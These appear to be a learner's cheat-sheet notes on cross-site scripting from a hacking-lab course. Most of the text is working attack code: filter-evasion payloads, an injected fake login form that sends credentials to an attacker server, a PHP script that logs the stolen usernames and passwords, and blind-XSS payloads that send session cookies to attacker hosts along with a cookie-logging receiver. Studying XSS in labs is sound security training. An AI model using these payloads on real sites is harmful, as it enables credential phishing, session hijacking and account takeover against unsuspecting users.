Abuses Sanitation of `write` user input.

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
### Types of Attacks
|Type|Description|
|---|---|
|`Stored (Persistent) XSS`|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|`Reflected (Non-Persistent) XSS`|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|`DOM-based XSS`|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|

### Stored XSS
Stored in back-end database. 
The attack is persistent no matter the user.
#### Testing Payloads 
```JavaScript
<script>alert(window.origin)</script>
```
Sometimes alert  is blocked. 
Other examples:
`<plaintext>`
`<script>print()</script>`
### Reflected XSS
Non persistent and never reach the back-end
Do not occur on page refreshes.

To reach a target, send a payload contain the data.
Look at the GET request on dev settings. 
#### Test 
```JavaScript
<script>alert(window.origin)</script>
```
### DOM-Based

Data from an attacker controlled source such as a URL that has inner html.
```url 
http://example.com/query?=<script>window.location='http://attacker.com/?cookie='+document.cookie</script>
```

#### Test
```javascript
<script>alert('xss')</script>
```
### Basic Filter Evasion 
Use the offending tag twice
```javascript
<src<script>ipt>alert('XSS')</src<srcipt>ipt>
```
Changing capitalisation 
```JavaScript
<sCRiPt>alert('xss')</ScriPT>
```

## Phishing
### XSS Discovery 
```url 
http://SERVER_IP/phishing/index.php?url=https://www.hackthebox.eu/images/logo-htb.svg
```

```url
http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>
```

HTML Login Form 
```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

Payload
`document.getElementbyID` Removes the original form to make it look better 
```javascript
document.write('<h3>Please login to continue</h3><form action=http://[OUR_IP]><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

Write a file in the server root that returns the user back to the page original page
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
One Liner (change return URL)
```shell
mkdir /tmp/tmpserver
cd /tmp/tmpserver
echo '<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>' > index.php
sudo php -S 0.0.0.0:80
```


## Session Hijacking
If the XSS is blind load a script 
```html
<script src="http://OUR_IP/script.js"></script>
```
Add this with every field to work out which one is vulnerable to xss
```html
<script src="http://10.10.15.21/username"></script>
```


### Receiver one liner
```shell
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

### Hijack session
Once this works we can now session hijack
Example payloads 
Add this in our `script.js`

```javascript
document.location='http://10.10.15.21/index.php?c='+document.cookie;


new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
Payload to send
```html
<script src=http://OUR_IP/script.js></script>
```
Save the cookies:
```php
mkdir /tmp/tmpserver
cd /tmp/tmpserver
echo '
<?php
if (isset($_GET["c"])) {
    $list = explode(";", $_GET["c"]);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER["REMOTE_ADDR"]} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>' > index.php
sudo php -S 0.0.0.0:80
```
